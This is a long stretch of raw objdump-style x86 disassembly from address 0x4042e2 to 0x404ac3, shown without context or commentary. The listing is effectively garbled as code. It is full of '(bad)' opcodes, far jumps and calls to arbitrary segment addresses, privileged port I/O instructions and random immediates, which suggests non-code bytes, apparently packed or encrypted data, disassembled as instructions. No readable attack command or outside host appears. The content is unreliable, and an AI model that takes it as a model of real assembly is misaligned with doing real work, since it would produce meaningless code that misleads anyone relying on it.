  4042e2:	shl    DWORD PTR [esi+0x20290f5e],cl
  4042e8:	sub    DWORD PTR [eax+0x28],esi
  4042eb:	mov    BYTE PTR [ebx+ecx*4-0x462f0f79],0xdd
  4042f3:	push   edi
  4042f4:	jae    0x40432e
  4042f6:	(bad)  
  4042f7:	push   ss
  4042f8:	or     edi,edi
  4042fa:	add    dh,ah
  4042fc:	mov    bl,0x8f
  4042fe:	mov    esi,0xd7e8934e
  404303:	aam    0xf6
  404305:	aam    0x0
  404307:	ja     0x40431e
  404309:	adc    DWORD PTR [edx-0x41],edx
  40430c:	xchg   BYTE PTR [ebx-0x68],ah
  40430f:	or     ecx,ecx
  404311:	xchg   esp,eax
  404312:	xor    al,0xc1
  404314:	or     BYTE PTR ds:0x21f9567e,dl
  40431a:	ret    
  40431b:	fiadd  DWORD PTR [edi+0x2bccb9ce]
  404321:	sahf   
  404322:	data16 arpl WORD PTR [eax+0x41],sp
  404326:	rcl    ebp,cl
  404328:	and    al,0x8a
  40432a:	cmp    eax,0x8ac1e453
  40432f:	xchg   esp,eax
  404330:	out    dx,eax
  404331:	fisttp DWORD PTR [ecx-0x1e3845e5]
  404337:	arpl   WORD PTR [edx+0x5e5745f0],cx
  40433d:	jns    0x4042dc
  40433f:	sub    al,0xa0
  404341:	bound  ebx,QWORD PTR [edi-0xd4a6009]
  404347:	dec    ecx
  404348:	pop    ds
  404349:	iretw  
  40434b:	and    edi,eax
  40434d:	je     0x40430b
  40434f:	push   cs
  404350:	stos   BYTE PTR es:[edi],al
  404351:	mov    cs,WORD PTR [esi]
  404353:	rol    al,0x95
  404356:	pop    eax
  404357:	xchg   ebx,eax
  404358:	jb     0x40433f
  40435a:	retf   
  40435b:	iret   
  40435c:	sbb    al,BYTE PTR [ecx]
  40435e:	jmp    FWORD PTR [eax+eax*1-0x4f]
  404362:	stos   DWORD PTR es:[edi],eax
  404363:	push   ds
  404364:	icebp  
  404365:	(bad)  
  404366:	cmp    eax,0xcf2a938
  40436b:	out    dx,eax
  40436c:	push   esp
  40436d:	inc    DWORD PTR [ecx-0x3b]
  404370:	neg    BYTE PTR [esi-0x1a8b8c48]
  404376:	inc    ebp
  404377:	cmp    BYTE PTR [ecx+0x3d07be79],ch
  40437d:	mov    ds:0x14bbdfe9,eax
  404382:	push   ebp
  404383:	pop    eax
  404384:	ror    BYTE PTR [ebp-0x34c258fe],1
  40438a:	jecxz  0x4043e1
  40438c:	in     eax,dx
  40438d:	(bad)  
  40438e:	push   ss
  40438f:	sub    ecx,DWORD PTR [edx]
  404391:	mov    dh,0x94
  404393:	inc    ecx
  404394:	retf   0x1557
  404397:	add    al,BYTE PTR [esi]
  404399:	out    0x7d,eax
  40439b:	fidiv  WORD PTR [esi+ebx*8]
  40439e:	imul   ecx,DWORD PTR [esi+0x2c],0xffffffaf
  4043a2:	push   es
  4043a3:	pop    esp
  4043a4:	out    0xe,eax
  4043a6:	sub    DWORD PTR [esi-0x65],edx
  4043a9:	outs   dx,BYTE PTR ds:[esi]
  4043aa:	stc    
  4043ab:	xor    eax,0xbd7ad451
  4043b0:	sbb    al,0xaf
  4043b2:	fwait
  4043b3:	sar    ah,cl
  4043b5:	or     ah,BYTE PTR [edx]
  4043b7:	clc    
  4043b8:	rcr    DWORD PTR [ecx+0x1feb7c92],1
  4043be:	mov    esp,0x6938a0b0
  4043c3:	adc    eax,0xca97cf9c
  4043c8:	mov    dh,0x1a
  4043ca:	jmp    0x4043df
  4043cc:	jge    0x4043b1
  4043ce:	mov    WORD PTR [edi+edx*4+0x5ac2477b],fs
  4043d5:	inc    edx
  4043d6:	push   ebx
  4043d7:	ror    DWORD PTR [ecx+eax*1-0x7eb1a25e],0x40
  4043df:	scas   al,BYTE PTR es:[edi]
  4043e0:	inc    eax
  4043e1:	daa    
  4043e2:	pop    esp
  4043e3:	push   esp
  4043e4:	aad    0xdb
  4043e6:	xor    eax,0xf4bf73b8
  4043eb:	mov    ds:0x9d5e91af,eax
  4043f0:	push   ebp
  4043f1:	sti    
  4043f2:	mov    cl,0xfc
  4043f4:	mov    ebp,0x4ed73e0f
  4043f9:	mov    bl,0xc3
  4043fb:	push   ss
  4043fc:	fucom  st(0)
  4043fe:	into   
  4043ff:	fistp  QWORD PTR [edx+0xb]
  404402:	adc    DWORD PTR [edi+0x44],eax
  404405:	add    DWORD PTR [ecx],edi
  404407:	(bad)  
  404408:	mov    dh,0x4e
  40440a:	rcl    BYTE PTR ds:0xd7f70df3,0x33
  404411:	xchg   BYTE PTR [edi-0x6e],dh
  404414:	test   BYTE PTR [ebx],bh
  404416:	sbb    dh,bh
  404418:	add    bl,BYTE PTR [ecx]
  40441a:	push   esp
  40441b:	rol    edx,1
  40441d:	pop    ds
  40441e:	aaa    
  40441f:	push   esp
  404420:	mov    edx,0x1ab1566f
  404425:	int3   
  404426:	les    eax,FWORD PTR [edx-0x48]
  404429:	bound  ebx,QWORD PTR [edx+0x57]
  40442c:	mov    ds:0xb4bf6248,eax
  404431:	jg     0x4044b1
  404433:	inc    ecx
  404434:	xor    ebp,DWORD PTR [ebx+0x3afb453c]
  40443a:	sbb    eax,0x159ca01c
  40443f:	mov    al,ds:0x24080a15
  404444:	mov    edx,0x1e8a904b
  404449:	adc    al,0x72
  40444b:	mov    DWORD PTR [ebp+0x5],edi
  40444e:	rcl    DWORD PTR [esi+edi*1+0x46875f3e],cl
  404455:	and    eax,0xb78e45d0
  40445a:	mov    DWORD PTR [ebp+0x7f],ebx
  40445d:	mov    esi,0x30a01f61
  404462:	test   BYTE PTR [edx],cl
  404464:	inc    edx
  404465:	jmp    0x5a4eec06
  40446a:	or     esp,ebp
  40446c:	adc    cl,BYTE PTR [eax+ecx*8]
  40446f:	xor    eax,0xbec91c25
  404474:	mov    ch,0x26
  404476:	and    edi,edi
  404478:	out    dx,al
  404479:	mov    ecx,0xc668cfe5
  40447e:	pop    es
  40447f:	xchg   edx,eax
  404480:	cmp    BYTE PTR [edi+0x3663a9dd],0x91
  404487:	rol    BYTE PTR [esi-0x5e179926],1
  40448d:	push   0xffffffbd
  40448f:	or     eax,0x5d98294c
  404494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404495:	lea    ecx,[edi-0x56]
  404498:	mov    esp,0xba232405
  40449d:	cmp    DWORD PTR [edi+0x47b2d0dd],ecx
  4044a3:	icebp  
  4044a4:	sbb    al,0xf3
  4044a6:	sti    
  4044a7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044a9:	xchg   DWORD PTR [ebx+0x14475f97],edi
  4044af:	in     eax,0xd
  4044b1:	or     DWORD PTR [esi],esi
  4044b3:	dec    esi
  4044b4:	push   ecx
  4044b5:	dec    ebx
  4044b6:	(bad)  
  4044b7:	xor    DWORD PTR [edx-0x67844a0d],esp
  4044bd:	cmp    ebx,DWORD PTR [edi-0x1901b586]
  4044c3:	popf   
  4044c4:	fist   WORD PTR [esi-0x30424a5f]
  4044ca:	sbb    ah,BYTE PTR [edx+0x74]
  4044cd:	inc    edi
  4044ce:	daa    
  4044cf:	mov    ecx,DWORD PTR [eax-0x4a0017c3]
  4044d5:	cmp    eax,0x36cc8a04
  4044da:	xor    eax,0x83844615
  4044df:	sbb    BYTE PTR [ebp+0x77],cl
  4044e2:	cmp    BYTE PTR [edx],al
  4044e4:	jge    0x404508
  4044e6:	sahf   
  4044e7:	add    bl,BYTE PTR [eax+0x7f]
  4044ea:	cmp    DWORD PTR [ebx-0x829c915],0x5a
  4044f1:	xchg   edi,eax
  4044f2:	loopne 0x404485
  4044f4:	jno    0x404525
  4044f6:	or     DWORD PTR [edi],eax
  4044f8:	push   esp
  4044f9:	or     BYTE PTR [eax-0x386f00c4],dh
  4044ff:	add    bl,dh
  404501:	pop    ebp
  404502:	test   ch,0x86
  404505:	lods   al,BYTE PTR ds:[esi]
  404506:	mov    al,0x10
  404508:	jle    0x404536
  40450a:	sbb    DWORD PTR [edx-0x6a806aba],esi
  404510:	lds    esi,FWORD PTR [esi-0x35]
  404513:	jae    0x40450c
  404515:	mov    BYTE PTR [esi+0x6c80a3bf],ch
  40451b:	loopne 0x404551
  40451d:	ret    0x9a00
  404520:	jg     0x404522
  404522:	push   ebp
  404523:	std    
  404524:	push   eax
  404525:	pop    ecx
  404526:	ss dec edx
  404528:	adc    ebp,DWORD PTR [edx+0x5d]
  40452b:	ss jle 0x404547
  40452e:	and    BYTE PTR [eax-0x7a],cl
  404531:	(bad)  
  404533:	push   0x4d28bdc5
  404538:	ins    DWORD PTR es:[edi],dx
  404539:	mov    al,0xc6
  40453b:	rol    ebx,0x1f
  40453e:	call   0xf238:0x9b4851c6
  404545:	imul   ecx,esi,0xd08e1779
  40454b:	dec    esi
  40454c:	jp     0x40457b
  40454e:	scas   al,BYTE PTR es:[edi]
  40454f:	push   ds
  404550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404551:	cmp    BYTE PTR [eax],ah
  404553:	mov    BYTE PTR [esi+0x65],al
  404556:	jmp    0xe75a:0x8f86064a
  40455d:	sbb    eax,0x886ec3e2
  404562:	std    
  404563:	xchg   ecx,eax
  404564:	and    cl,BYTE PTR [ebx+eiz*8-0x10]
  404568:	jl     0x4045c7
  40456a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40456b:	pushf  
  40456c:	xchg   ebx,eax
  40456d:	cld    
  40456e:	fnstsw WORD PTR [ebx]
  404570:	xchg   edx,eax
  404571:	pushf  
  404572:	and    al,0x16
  404574:	xchg   ebx,eax
  404575:	mov    al,0x36
  404577:	adc    eax,0x60619b62
  40457c:	jmp    0x4f8c:0xac451efb
  404583:	inc    esp
  404584:	call   0x72f0:0xfd9bebda
  40458b:	in     eax,dx
  40458c:	fnstenv [edi+0x3e]
  40458f:	and    eax,0xd1f9401b
  404594:	pop    ss
  404595:	mov    dl,0x41
  404597:	or     ebx,DWORD PTR [ebp-0x64738bf4]
  40459d:	pop    ecx
  40459e:	sub    esi,DWORD PTR [ebp+0xf]
  4045a1:	mov    ds:0xbab23c1b,al
  4045a6:	mov    ch,0xae
  4045a8:	sbb    BYTE PTR [ecx+eax*1],ah
  4045ab:	sar    BYTE PTR [edx],0xdb
  4045ae:	ret    
  4045af:	mov    al,0xcc
  4045b1:	retf   0xabb4
  4045b4:	leave  
  4045b5:	push   ebx
  4045b6:	retf   
  4045b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045b8:	sub    BYTE PTR [ebp+0x9],dl
  4045bb:	pop    edx
  4045bc:	fcomp  st(4)
  4045be:	sub    BYTE PTR [edx],dl
  4045c0:	sbb    al,0x58
  4045c2:	das    
  4045c3:	fwait
  4045c4:	out    dx,eax
  4045c5:	js     0x404601
  4045c7:	leave  
  4045c8:	jmp    0x5cac:0x387c7a98
  4045cf:	stos   BYTE PTR es:[edi],al
  4045d0:	sbb    eax,0x6cd95f0e
  4045d5:	pop    ebp
  4045d6:	pop    ds
  4045d7:	mov    ds:0xe83e7ab0,al
  4045dc:	leave  
  4045dd:	add    eax,0xd36f92fd
  4045e2:	xchg   ebx,eax
  4045e3:	mov    al,cl
  4045e5:	add    ecx,ebp
  4045e7:	xchg   edx,eax
  4045e8:	xor    al,0x20
  4045ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045eb:	js     0x4045c7
  4045ed:	dec    BYTE PTR [edx-0x5]
  4045f0:	xchg   edx,eax
  4045f1:	jge    0x40457e
  4045f3:	dec    ebx
  4045f4:	fcom   QWORD PTR [ecx+0x5e]
  4045f7:	repnz xchg edi,eax
  4045f9:	ret    0xaea6
  4045fc:	stos   DWORD PTR es:[di],eax
  4045fe:	xchg   ebp,eax
  4045ff:	out    dx,eax
  404600:	enter  0xc307,0xb4
  404604:	xchg   DWORD PTR [eax+esi*2-0x18],esp
  404608:	repz pop es
  40460a:	push   0x13f3475a
  40460f:	adc    DWORD PTR [edx-0x52c69d26],ebp
  404615:	sub    edi,edi
  404617:	out    dx,eax
  404618:	popf   
  404619:	je     0x4045bd
  40461b:	test   al,0x9b
  40461d:	jg     0x404637
  40461f:	mov    al,0xa6
  404621:	xchg   ecx,eax
  404622:	test   DWORD PTR [edi-0x60],0x5424431a
  404629:	out    dx,eax
  40462a:	sub    bl,ah
  40462c:	add    edi,DWORD PTR [ebx+edi*8]
  40462f:	shl    bl,1
  404631:	mov    eax,0x991e7b13
  404636:	imul   eax,DWORD PTR [eax],0xd68db1c
  40463c:	pop    ebx
  40463d:	mov    BYTE PTR [ecx],0xfd
  404640:	and    bl,dl
  404642:	and    DWORD PTR [edi+0x3c6dc74],eax
  404648:	xchg   DWORD PTR [eax],esi
  40464a:	adc    DWORD PTR [ebp-0x11],ebx
  40464d:	hlt    
  40464e:	cmc    
  40464f:	sbb    al,0x79
  404651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404652:	rcr    ebp,0x66
  404655:	mov    ecx,eax
  404657:	icebp  
  404658:	or     dh,BYTE PTR [esi-0x68]
  40465b:	pop    ds
  40465c:	sub    ah,BYTE PTR es:[ecx]
  40465f:	pop    es
  404660:	adc    DWORD PTR [ecx],ecx
  404662:	and    BYTE PTR [edi-0x6d96dcd4],bl
  404668:	je     0x4046e6
  40466a:	(bad)  
  40466b:	rol    DWORD PTR [edx+0x3f],1
  40466e:	imul   ebx,DWORD PTR [ecx-0x51],0x3
  404672:	imul   edx,DWORD PTR ds:0xeb4170f9,0x7d6fd101
  40467c:	push   ds
  40467d:	gs mov bl,0xc6
  404680:	mov    DWORD PTR [ecx-0x678b60fb],esi
  404686:	dec    ecx
  404687:	lea    eax,[esp+ebx*1]
  40468a:	pop    ds
  40468b:	das    
  40468c:	mov    ds:0xbe74c9f5,al
  404691:	pop    bp
  404693:	ror    dl,1
  404695:	cdq    
  404696:	mov    es,edi
  404698:	mov    edi,0x6af44f6d
  40469d:	fisttp DWORD PTR [ebx]
  40469f:	xlat   BYTE PTR ds:[ebx]
  4046a0:	jle    0x404719
  4046a2:	add    ebx,DWORD PTR [esi]
  4046a4:	sub    eax,0xe5ffa63f
  4046a9:	in     eax,dx
  4046aa:	mov    ah,bh
  4046ac:	stos   BYTE PTR es:[edi],al
  4046ad:	ret    0xdb2f
  4046b0:	and    al,0xd1
  4046b2:	push   esp
  4046b3:	mov    WORD PTR [eax-0x42c268ad],cs
  4046b9:	mov    dh,0x7c
  4046bb:	das    
  4046bc:	fdivr  QWORD PTR [eax]
  4046be:	mov    ds:0x9b28557c,al
  4046c3:	pop    edx
  4046c4:	mov    dh,0xb7
  4046c6:	leave  
  4046c7:	mov    esp,cs
  4046c9:	(bad)  
  4046ca:	dec    ebp
  4046cb:	stos   DWORD PTR es:[edi],eax
  4046cc:	imul   edi,ebp,0x7a
  4046cf:	sbb    ebx,esp
  4046d1:	(bad)  
  4046d2:	mov    ds:0x3eaa064b,eax
  4046d7:	imul   edx,esi,0x519f46b4
  4046dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046de:	adc    DWORD PTR [eax-0x70b6e830],0xffffffe9
  4046e5:	dec    esp
  4046e6:	xor    cl,BYTE PTR [ebp-0x18]
  4046e9:	push   eax
  4046ea:	std    
  4046eb:	int    0x80
  4046ed:	mov    eax,0x3af0864a
  4046f2:	out    0xd3,al
  4046f4:	adc    edx,DWORD PTR ds:0xe8a68074
  4046fa:	xchg   esi,eax
  4046fb:	aad    0x27
  4046fd:	jne    0x404723
  4046ff:	out    0x85,al
  404701:	sbb    DWORD PTR [ebx+ebx*8],0xffffff94
  404705:	(bad)  
  404706:	in     al,dx
  404707:	(bad)  
  404708:	lods   eax,DWORD PTR ds:[esi]
  404709:	sbb    ah,BYTE PTR [ecx+0xf7ad6b]
  40470f:	xor    ecx,DWORD PTR [ecx]
  404711:	mov    al,ds:0xb346c371
  404716:	sar    DWORD PTR [esi],cl
  404718:	mov    ds:0x92754532,eax
  40471d:	int    0x93
  40471f:	dec    DWORD PTR [ecx+0x57]
  404722:	std    
  404723:	mov    cl,BYTE PTR [edx+0xf5fef62]
  404729:	pop    ebx
  40472a:	xchg   ecx,eax
  40472b:	xor    eax,0x1b5eb550
  404730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404731:	xor    ah,dh
  404733:	lds    ebp,FWORD PTR [ebx]
  404735:	fstp   QWORD PTR [edx+0x17b377d2]
  40473b:	add    bh,BYTE PTR [ebp-0x6327196b]
  404741:	push   esp
  404742:	inc    esp
  404743:	scas   eax,DWORD PTR es:[edi]
  404744:	(bad)  
  404745:	aam    0xb8
  404747:	mov    WORD PTR [ebx],es
  404749:	test   BYTE PTR [ebx],bh
  40474b:	sbb    dh,BYTE PTR [edx-0x27]
  40474e:	pop    ebx
  40474f:	aad    0xe6
  404751:	stc    
  404752:	das    
  404753:	xchg   ebx,eax
  404754:	adc    eax,0xce1ca748
  404759:	cmc    
  40475a:	add    edx,ebp
  40475c:	mov    DWORD PTR [ebx-0x4e],0x1f90fc5
  404763:	jl     0x4047b5
  404765:	push   ecx
  404766:	push   ebx
  404767:	mov    ds:0x808683f2,al
  40476c:	xchg   ebp,eax
  40476d:	mov    esp,0xd126132e
  404772:	fisttp WORD PTR [edx+eiz*8+0x2c]
  404776:	ss mov dl,0x1d
  404779:	mov    ss,WORD PTR [ecx]
  40477b:	popf   
  40477c:	retf   
  40477d:	outs   dx,BYTE PTR ds:[esi]
  40477e:	inc    esp
  40477f:	jp     0x40476a
  404781:	xchg   ebx,eax
  404782:	dec    esi
  404783:	jno    0x40476e
  404785:	in     al,dx
  404786:	test   DWORD PTR [eax+0x38d25c49],ecx
  40478c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40478d:	add    esi,edx
  40478f:	and    al,0xdf
  404791:	push   ebp
  404792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404793:	addr16 (bad) 
  404795:	pushf  
  404796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404797:	stc    
  404798:	add    eax,0xb6cff36d
  40479d:	mov    edx,0x9ef8de2d
  4047a2:	es popa 
  4047a4:	or     DWORD PTR [eax-0x14],edi
  4047a7:	sub    DWORD PTR [edx-0x50],ebp
  4047aa:	ins    BYTE PTR es:[edi],dx
  4047ab:	jle    0x40482c
  4047ad:	lods   al,BYTE PTR ds:[esi]
  4047ae:	out    dx,al
  4047af:	xor    DWORD PTR [ebp+eax*8+0x7],eax
  4047b3:	sti    
  4047b4:	push   edi
  4047b5:	push   esi
  4047b6:	add    BYTE PTR [ebx],dl
  4047b8:	loope  0x404797
  4047ba:	sub    eax,0x89082db
  4047bf:	xchg   ebp,eax
  4047c0:	bound  ebp,QWORD PTR [ecx+eiz*1-0xd7ca603]
  4047c7:	lock call 0x6260ac78
  4047cd:	adc    DWORD PTR [esi],edi
  4047cf:	and    eax,DWORD PTR [esi-0x3e]
  4047d2:	xchg   edx,eax
  4047d3:	jo     0x4047c1
  4047d5:	mov    eax,ds:0xd62305f9
  4047da:	daa    
  4047db:	cld    
  4047dc:	ja     0x4047a2
  4047de:	dec    edx
  4047df:	add    ch,BYTE PTR [ebp+0x11560d4b]
  4047e5:	dec    eax
  4047e6:	push   0x2b
  4047e8:	scas   eax,DWORD PTR es:[edi]
  4047e9:	lds    ecx,FWORD PTR [edx-0x5af156ff]
  4047ef:	jmp    0x4047f8
  4047f1:	sub    eax,0x5c69fc88
  4047f6:	and    eax,0x14ba3cb0
  4047fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047fc:	jmp    edi
  4047fe:	xchg   ebp,ecx
  404800:	mov    al,0xba
  404802:	push   ebp
  404803:	in     al,0xe8
  404805:	and    BYTE PTR [ebp+0x62a52549],cl
  40480b:	add    DWORD PTR [ebp+0x6a],0xe5bc1770
  404812:	ret    
  404813:	dec    edi
  404814:	cs inc edx
  404816:	sub    al,BYTE PTR [edx]
  404818:	and    bl,BYTE PTR [esp+esi*8-0x31]
  40481c:	stos   DWORD PTR es:[edi],eax
  40481d:	jno    0x4047c2
  40481f:	mov    ds:0xa4c9dec7,eax
  404824:	sub    al,0xd3
  404826:	push   ss
  404827:	outs   dx,DWORD PTR ds:[esi]
  404828:	jo     0x40487d
  40482a:	test   DWORD PTR [esi+0x42],0x52dc8795
  404831:	adc    dl,BYTE PTR [eax+0x75]
  404834:	adc    ecx,edx
  404836:	cli    
  404837:	je     0x404875
  404839:	and    DWORD PTR [edx],0xfc2a6ce
  40483f:	mov    ds:0x8fa7496b,al
  404844:	cs test al,0xf4
  404847:	add    BYTE PTR [ebp-0x473f9334],0xa6
  40484e:	and    ah,BYTE PTR ss:[ebp-0x7c1d8a21]
  404855:	int3   
  404856:	pop    eax
  404857:	cdq    
  404858:	test   DWORD PTR ds:0x6e5b3eb3,ebp
  40485e:	cvtps2pi mm3,QWORD PTR [eax-0x621ed388]
  404865:	je     0x4048a0
  404867:	pop    edx
  404868:	loop   0x404897
  40486a:	unpcklps xmm1,XMMWORD PTR [ecx]
  40486d:	stos   BYTE PTR es:[edi],al
  40486e:	xchg   ebp,eax
  40486f:	scas   eax,DWORD PTR es:[edi]
  404870:	pop    es
  404871:	cmp    al,0x81
  404873:	sahf   
  404874:	sub    al,0xf2
  404876:	jg     0x4048c9
  404878:	aas    
  404879:	(bad)  [ecx-0x34]
  40487c:	xor    BYTE PTR [eax+esi*4+0x79],0xf4
  404881:	aas    
  404882:	and    BYTE PTR [edx-0x3b],ch
  404885:	inc    esp
  404886:	pop    edi
  404887:	dec    esp
  404888:	add    BYTE PTR [ecx-0x7ae8766e],ah
  40488e:	gs fabs 
  404891:	test   al,0x1d
  404893:	clc    
  404894:	jmp    0x40481e
  404896:	es cli 
  404898:	in     eax,dx
  404899:	fs sub eax,0xfaf88278
  40489f:	in     al,0x8b
  4048a1:	popf   
  4048a2:	and    bl,BYTE PTR [edx-0x79]
  4048a5:	mov    eax,0x906a1def
  4048aa:	imul   ecx,ebp,0x28
  4048ad:	stc    
  4048ae:	ins    BYTE PTR es:[edi],dx
  4048af:	add    eax,0xad77853f
  4048b4:	mov    bl,0xbb
  4048b6:	int    0x12
  4048b8:	sbb    BYTE PTR [ebx+edi*2-0xe7414d4],bh
  4048bf:	rol    DWORD PTR [esi*1+0x4915f420],cl
  4048c6:	adc    dh,ah
  4048c8:	int    0xd8
  4048ca:	xchg   edx,eax
  4048cb:	fiadd  WORD PTR [esi+0x72]
  4048ce:	sbb    ah,BYTE PTR [edi]
  4048d0:	rcl    DWORD PTR [edx+ecx*1+0x75dce22],0x46
  4048d8:	loopne 0x404933
  4048da:	(bad)  
  4048db:	mov    edx,0x2cf44cf1
  4048e0:	pop    eax
  4048e1:	stc    
  4048e2:	ret    
  4048e3:	hlt    
  4048e4:	adc    eax,0x679cbce5
  4048e9:	fs push edx
  4048eb:	mov    ds:0x65034e12,eax
  4048f0:	int3   
  4048f1:	lahf   
  4048f2:	cmp    ecx,ebx
  4048f4:	retf   
  4048f5:	adc    DWORD PTR [edx-0x43],esi
  4048f8:	sbb    DWORD PTR [eax+0x5d9e2c2d],esi
  4048fe:	imul   ebx,DWORD PTR [edi-0x41],0xc35ea473
  404905:	test   DWORD PTR [esi],ebp
  404907:	loop   0x40494a
  404909:	push   esi
  40490a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40490b:	cmovg  eax,DWORD PTR [edi+0xd]
  40490f:	int    0xa3
  404911:	(bad)  
  404912:	es imul esp,eax,0x68
  404916:	cmc    
  404917:	cwde   
  404918:	in     al,0x4e
  40491a:	and    esi,DWORD PTR [eax]
  40491c:	retf   
  40491d:	in     eax,dx
  40491e:	inc    ebp
  40491f:	popf   
  404920:	pop    eax
  404921:	mov    ebx,0x1a9f4150
  404926:	inc    edx
  404927:	sbb    ch,BYTE PTR [edx+0x5318ee34]
  40492d:	imul   edx,DWORD PTR [ecx+ebp*1],0x4b
  404931:	dec    edi
  404932:	mov    eax,ds:0xb6057c07
  404937:	int3   
  404938:	ret    
  404939:	dec    ecx
  40493a:	cs pop edx
  40493c:	mov    al,ds:0x3f219183
  404941:	div    BYTE PTR [esi+0x17]
  404944:	les    edi,FWORD PTR [ecx+0x1f63fb72]
  40494a:	pop    esi
  40494b:	std    
  40494c:	or     DWORD PTR [edi],ebp
  40494e:	jecxz  0x4048e8
  404950:	repz not BYTE PTR [eax]
  404953:	mov    edx,0x62603b0c
  404958:	jle    0x4048ed
  40495a:	gs sbb eax,0xf7d0e438
  404960:	mov    ah,0x0
  404962:	inc    edi
  404963:	ret    0xfb25
  404966:	fs push ss
  404968:	mov    al,0xea
  40496a:	sub    bh,bl
  40496c:	mov    cl,0x22
  40496e:	test   al,0x2d
  404970:	inc    edi
  404971:	mov    ch,0x71
  404973:	imul   ecx,DWORD PTR [edx],0x36
  404976:	push   0x11
  404978:	test   BYTE PTR [eax+0x632a645],0x6d
  40497f:	inc    eax
  404980:	fnsave [ebp-0xdba5629]
  404986:	ret    0x33a9
  404989:	mov    cl,0x3b
  40498b:	dec    ecx
  40498c:	add    ebx,DWORD PTR [esi]
  40498e:	neg    BYTE PTR [esi+0x369bf2d1]
  404994:	push   edx
  404995:	loop   0x40495e
  404997:	(bad)  
  404998:	dec    ebx
  404999:	xchg   ah,dl
  40499b:	lds    edi,FWORD PTR [eax]
  40499d:	cs push edx
  40499f:	add    ecx,ebp
  4049a1:	retf   
  4049a2:	outs   dx,BYTE PTR ds:[esi]
  4049a3:	xlat   BYTE PTR ds:[ebx]
  4049a4:	sbb    al,0xbe
  4049a6:	fcom   DWORD PTR [edx-0xd44f325]
  4049ac:	stos   BYTE PTR es:[edi],al
  4049ad:	loop   0x40496b
  4049af:	jns    0x404996
  4049b1:	push   ss
  4049b2:	nop
  4049b3:	retf   
  4049b4:	inc    eax
  4049b5:	mov    eax,ds:0x4d89354e
  4049ba:	inc    edx
  4049bb:	out    0xc1,al
  4049bd:	xchg   esi,eax
  4049be:	dec    ebp
  4049bf:	retf   
  4049c0:	(bad)  
  4049c1:	std    
  4049c2:	jmp    0x2a16:0x9e8e2740
  4049c9:	mov    eax,0xd767b23c
  4049ce:	lds    esi,FWORD PTR [ecx]
  4049d0:	stos   DWORD PTR es:[edi],eax
  4049d1:	dec    esp
  4049d2:	enter  0x59e2,0xc1
  4049d6:	dec    ecx
  4049d7:	cmp    al,0xb3
  4049d9:	ins    DWORD PTR es:[edi],dx
  4049da:	popa   
  4049db:	call   0x8738:0xf7748876
  4049e2:	(bad)  
  4049e3:	not    DWORD PTR [esi+0x30]
  4049e6:	out    dx,eax
  4049e7:	test   esp,ecx
  4049e9:	rcl    DWORD PTR [ebx+ebx*4+0x68],cl
  4049ed:	dec    ebp
  4049ee:	popa   
  4049ef:	mov    ebp,0x7ccfa2b1
  4049f4:	ss jns 0x404a1c
  4049f7:	lahf   
  4049f8:	xor    DWORD PTR ds:0x729623c0,ebp
  4049fe:	pop    edx
  4049ff:	popa   
  404a00:	sub    esp,DWORD PTR [ebx]
  404a02:	mov    al,ds:0xbd1a3415
  404a07:	sbb    BYTE PTR [eax],ah
  404a09:	push   0xfe13de62
  404a0e:	adc    al,0x46
  404a10:	(bad)  
  404a11:	push   ds
  404a12:	push   0xe083d7d3
  404a17:	pop    ebp
  404a18:	cwde   
  404a19:	adc    al,0x9
  404a1b:	mov    edi,0xffe92ac2
  404a20:	inc    edx
  404a21:	jae    0x404a5a
  404a23:	ds inc eax
  404a25:	test   ebp,ecx
  404a27:	and    BYTE PTR [edx-0x24],bh
  404a2a:	jmp    DWORD PTR [esi+0x157fb2c9]
  404a30:	xor    al,0xa8
  404a32:	hlt    
  404a33:	xchg   BYTE PTR [ecx],bh
  404a35:	cdq    
  404a36:	retf   0x8ad4
  404a39:	or     cl,BYTE PTR [edi-0x68e0c5c6]
  404a3f:	stos   DWORD PTR es:[edi],eax
  404a40:	adc    eax,0xb87273ca
  404a45:	xlat   BYTE PTR ds:[ebx]
  404a46:	mov    eax,DWORD PTR [ecx+0x1d]
  404a49:	xor    BYTE PTR [esi],bh
  404a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a4c:	out    0xe9,al
  404a4e:	inc    edi
  404a4f:	sub    edi,DWORD PTR [esi+0x65]
  404a52:	sar    BYTE PTR [ebx+0x46],cl
  404a55:	test   eax,0x1ff27a29
  404a5a:	fnsave [edx-0x5e]
  404a5d:	call   0x56680081
  404a62:	ror    DWORD PTR [ecx-0x6298bfe],1
  404a68:	cmc    
  404a69:	inc    eax
  404a6a:	loope  0x404a98
  404a6c:	rcr    DWORD PTR [esi],1
  404a6e:	dec    esi
  404a6f:	mov    WORD PTR [esi-0x24468191],fs
  404a75:	aam    0x8c
  404a77:	or     ebx,esp
  404a79:	mov    bl,0x2f
  404a7b:	test   eax,0x82a5b21b
  404a80:	ins    BYTE PTR es:[edi],dx
  404a81:	inc    esp
  404a82:	adc    DWORD PTR [ebp-0x2598424d],ebx
  404a88:	shl    al,cl
  404a8a:	enter  0x9acf,0xf8
  404a8e:	jl     0x404abb
  404a90:	sbb    ch,BYTE PTR [edi-0x31457817]
  404a96:	or     bh,BYTE PTR [ecx+edx*1+0x28]
  404a9a:	jo     0x404a6c
  404a9c:	xor    eax,0xff505cfa
  404aa1:	jmp    0x404b0e
  404aa3:	jmp    0x9bad:0x68d4c7c9
  404aaa:	call   0x3c2a:0xa9b80c20
  404ab1:	mov    ds:0xc62fb5a3,eax
  404ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ab7:	add    dl,BYTE PTR [edi+0x14acd553]
  404abd:	pusha  
  404abe:	inc    DWORD PTR [ebp+0x5d]
  404ac1:	in     eax,0xd9
  404ac3:	push   ss
